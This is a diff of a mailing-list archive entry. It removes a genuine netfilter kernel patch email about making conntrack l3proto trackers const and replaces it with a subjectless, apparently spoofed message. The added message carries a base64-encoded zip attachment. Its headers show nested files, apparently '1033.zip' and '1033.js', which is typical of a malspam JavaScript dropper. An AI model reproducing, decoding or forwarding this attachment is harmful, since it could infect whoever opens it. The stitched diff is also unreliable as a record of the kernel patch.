@@ -1,80 +1,68 @@
-From: Florian Westphal <fw@strlen.de>
-Subject: [PATCH nf-next] netfilter: conntrack: make l3proto trackers const
-Date: Thu, 12 Oct 2017 09:38:30 +0200
-Message-ID: <20171012073830.9102-1-fw@strlen.de>
-Cc: Florian Westphal <fw@strlen.de>
+From: <sophie.norman@macquarie.com>
+Subject: (unknown)
+Date: Thu, 12 Oct 2017 11:46:07 -0000
+Message-ID: <150780876739.31213.795395835415638621@optonline.net>
+Mime-Version: 1.0
+Content-Type: application/zip; name="80972472247.zip"
+Content-Transfer-Encoding: base64
 To: <netfilter-devel@vger.kernel.org>
 Return-path: <netfilter-devel-owner@vger.kernel.org>
-Received: from Chamillionaire.breakpoint.cc ([146.0.238.67]:44380 "EHLO
-        Chamillionaire.breakpoint.cc" rhost-flags-OK-OK-OK-OK)
-        by vger.kernel.org with ESMTP id S1750716AbdJLHiO (ORCPT
-        <rfc822;netfilter-devel@vger.kernel.org>);
-        Thu, 12 Oct 2017 03:38:14 -0400
+Received: from ool-18bbfbaa.static.optonline.net ([24.187.251.170]:42162 "HELO
+        optonline.net" rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with SMTP
+        id S1756490AbdJLLqK (ORCPT <rfc822;netfilter-devel@vger.kernel.org>);
+        Thu, 12 Oct 2017 07:46:10 -0400
+Content-Disposition: attachment
+Subject: 
 Sender: netfilter-devel-owner@vger.kernel.org
 List-ID: <netfilter-devel.vger.kernel.org>
 
-previous patches removed all writes to them.
-
-Signed-off-by: Florian Westphal <fw@strlen.de>
----
- include/net/netfilter/ipv4/nf_conntrack_ipv4.h | 2 +-
- include/net/netfilter/ipv6/nf_conntrack_ipv6.h | 2 +-
- net/ipv4/netfilter/nf_conntrack_l3proto_ipv4.c | 2 +-
- net/ipv6/netfilter/nf_conntrack_l3proto_ipv6.c | 2 +-
- 4 files changed, 4 insertions(+), 4 deletions(-)
-
-diff --git a/include/net/netfilter/ipv4/nf_conntrack_ipv4.h b/include/net/netfilter/ipv4/nf_conntrack_ipv4.h
-index 919e4e8af327..5534ecca7a5d 100644
---- a/include/net/netfilter/ipv4/nf_conntrack_ipv4.h
-+++ b/include/net/netfilter/ipv4/nf_conntrack_ipv4.h
-@@ -10,7 +10,7 @@
- #define _NF_CONNTRACK_IPV4_H
- 
- 
--extern struct nf_conntrack_l3proto nf_conntrack_l3proto_ipv4;
-+const extern struct nf_conntrack_l3proto nf_conntrack_l3proto_ipv4;
- 
- extern struct nf_conntrack_l4proto nf_conntrack_l4proto_tcp4;
- extern struct nf_conntrack_l4proto nf_conntrack_l4proto_udp4;
-diff --git a/include/net/netfilter/ipv6/nf_conntrack_ipv6.h b/include/net/netfilter/ipv6/nf_conntrack_ipv6.h
-index eaea968f8657..30dc57980866 100644
---- a/include/net/netfilter/ipv6/nf_conntrack_ipv6.h
-+++ b/include/net/netfilter/ipv6/nf_conntrack_ipv6.h
-@@ -1,7 +1,7 @@
- #ifndef _NF_CONNTRACK_IPV6_H
- #define _NF_CONNTRACK_IPV6_H
- 
--extern struct nf_conntrack_l3proto nf_conntrack_l3proto_ipv6;
-+extern const struct nf_conntrack_l3proto nf_conntrack_l3proto_ipv6;
- 
- extern struct nf_conntrack_l4proto nf_conntrack_l4proto_tcp6;
- extern struct nf_conntrack_l4proto nf_conntrack_l4proto_udp6;
-diff --git a/net/ipv4/netfilter/nf_conntrack_l3proto_ipv4.c b/net/ipv4/netfilter/nf_conntrack_l3proto_ipv4.c
-index fe374da4bc13..89af9d88ca21 100644
---- a/net/ipv4/netfilter/nf_conntrack_l3proto_ipv4.c
-+++ b/net/ipv4/netfilter/nf_conntrack_l3proto_ipv4.c
-@@ -344,7 +344,7 @@ static void ipv4_hooks_unregister(struct net *net)
- 	mutex_unlock(&register_ipv4_hooks);
- }
- 
--struct nf_conntrack_l3proto nf_conntrack_l3proto_ipv4 __read_mostly = {
-+const struct nf_conntrack_l3proto nf_conntrack_l3proto_ipv4 = {
- 	.l3proto	 = PF_INET,
- 	.pkt_to_tuple	 = ipv4_pkt_to_tuple,
- 	.invert_tuple	 = ipv4_invert_tuple,
-diff --git a/net/ipv6/netfilter/nf_conntrack_l3proto_ipv6.c b/net/ipv6/netfilter/nf_conntrack_l3proto_ipv6.c
-index fe01dc953c56..3b80a38f62b8 100644
---- a/net/ipv6/netfilter/nf_conntrack_l3proto_ipv6.c
-+++ b/net/ipv6/netfilter/nf_conntrack_l3proto_ipv6.c
-@@ -339,7 +339,7 @@ static void ipv6_hooks_unregister(struct net *net)
- 	mutex_unlock(&register_ipv6_hooks);
- }
- 
--struct nf_conntrack_l3proto nf_conntrack_l3proto_ipv6 __read_mostly = {
-+const struct nf_conntrack_l3proto nf_conntrack_l3proto_ipv6 = {
- 	.l3proto		= PF_INET6,
- 	.pkt_to_tuple		= ipv6_pkt_to_tuple,
- 	.invert_tuple		= ipv6_invert_tuple,
--- 
-2.13.6
-
+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
+BgAAAAABAAEAWgAAAIwKAAAAAA==
